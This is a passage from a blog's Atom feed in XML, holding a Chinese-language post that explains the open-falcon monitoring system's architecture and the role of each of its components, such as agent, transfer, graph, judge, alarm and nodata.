      <category term="redis" scheme="http://www.mydreamdll.xyz/categories/redis/"/>
    
    
      <category term="redis" scheme="http://www.mydreamdll.xyz/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon 架构</title>
    <link href="http://www.mydreamdll.xyz/2020/01/20/open-falcon%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/20/open-falcon%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-20T02:43:59.701Z</published>
    <updated>2020-01-20T02:43:59.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-架构"><a href="#open-falcon-架构" class="headerlink" title="open-falcon 架构"></a>open-falcon 架构</h2><p>open-falcon 主要架构图：</p><p><img src="/images/func_intro_1.png" alt="open-falcon architecture"></p><p>各个模块说明：</p><p>agent 组件：</p><p>目前 agent 服务已经覆盖公司大部分机器，一个自动采集机器指标的自动化服务。</p><p>数据上报支持三种方式: </p><ol><li><p>agent 自采集基础监控上报；</p></li><li><p>用户自定义推送数据 (数据按照指定格式推送到本地 agent 端口)；</p></li><li><p>插件采集上报。</p></li></ol><p>hbs 组件：</p><p>心跳服务器，定时从 DB 获取节点与主机对应关系、插件与节点绑定列表、模板、策略、全局策略等信息；将插件与节点绑定关系解析为插件与主机一一对应关系，并提供 rpc 接口方便所有 agent 查询；将 agent 上报的版本信息、插件信息写入 falcon 数据库；将模板、策略解析为策略与主机的关系对应表，与全局策略一起，以 rpc 方式提供给 judge 服务，方便其定时获取。</p><p>transfer 组件：</p><p>启动时维护两个一致性哈希列表，分别对应 graph 服务与 judge 服务，用于通过 endpoint 和 counter 计算得到的 MD5，定位每条监控数据应该存储到哪个 graph 实例和 judge 实例；提供数据转发功能，将 agent 通过 rpc 上报的监控数据，通过一致性哈希定位后，上报给相应的 graph 实例和 judge 实例；使用 rpc 接口提供 history 监控数据查询功能，用于绘图展示等。</p><p>graph 组件：</p><p>接入 rrdtool，用于监控数据持久化，通过 endpoint 和 counter 计算的 MD5 确定文件名；提供 rpc 接口，接收 transfer 上报的监控数据，并支持缓存，每个监控数据缓存半小时后再做数据持久化以减轻磁盘 IO 压力，提高整体吞吐量；提供索引缓存，每一个监控数据上报后，通过 endpoint、counter、step、timestamp 构建缓存，如果已存在则更新 timestamp，否则新建并上报至 graph 数据库；提供历史监控数据查询的 rpc 接口，便于 transfer 调用查询，查询时先通过索引缓存确认相应的 endpoint、counter 是否存在，如果存在则查询合并 rrd 文件中持久化数据与缓存数据并返回，否则直接返回。</p><p>judge 组件：</p><p>定时从 hbs 服务获取主机与策略的一一对应关系、以及全局策略，统称告警策略，用于告警判别；提供 rpc 接口，用于接收 transfer 上报的监控数据，收到每条数据时，遍历所有告警策略，如果符合告警条件，则将告警策略和监控数据存储到 redis 队列。</p><p>alarm 组件：</p><p>不停遍历 redis 队列，从中取出 judge 存储的告警策略和监控数据，写入报警数据库，然后依照告警策略中配置的告警组和获取告警成员的联系方式，和告警形成一一对应的关系，上报给 redis，方便 alarm 的下游服务进行告警发送。</p><p>aggregator 组件：</p><p>集群监控的本质是一个聚合功能。单台机器的监控指标难以反应整个集群的情况，我们需要把整个集群的机器（体现为 xbox 某个节点下的机器）综合起来看。比如所有机器的 qps 加和才是整个集群的 qps，所有机器的 request_fail 数量 ÷ 所有机器的 request_total 数量 = 整个集群的请求失败率。我们计算出集群的某个整体指标之后，也会有 “查看该指标的历史趋势图” “为该指标配置报警” 这种需求，故而，我们会把这个指标重新 push 回监控 server 端，于是，你就可以把她当成一个普通 counter 来对待了。</p><p>nodata 组件：</p><p>nodata 能够和 judge 一起，监测采集项的上报异常，过程为: 配置了 nodata 的采集项超时未上报数据，nodata 生成一条非法的 mock 数据；用户在 judge 上配置相应的报警策略，收到 mock 数据就产生报警。采集项上报异常检测，作为 judge 的一个必要补充，能够使 judge 的实时报警功能更加完善、可靠。nodata 只为少数重要的采集项服务，其处理的采集项的数量，应该不多于 judge 的十分之一。滥用 nodata，将会给 falcon 的运维管理带来很多问题。通常 nodata 按照 step 从绘图中取不到打点数据时候，当然是有一定的容错 step，一般我们控制在 2 到 3 个 step。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-架构&quot;&gt;&lt;a href=&quot;#open-falcon-架构&quot; class=&quot;headerlink&quot; title=&quot;open-falcon 架构&quot;&gt;&lt;/a&gt;open-falcon 架构&lt;/h2&gt;&lt;p&gt;open-falcon 主要架构图：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
</feed>
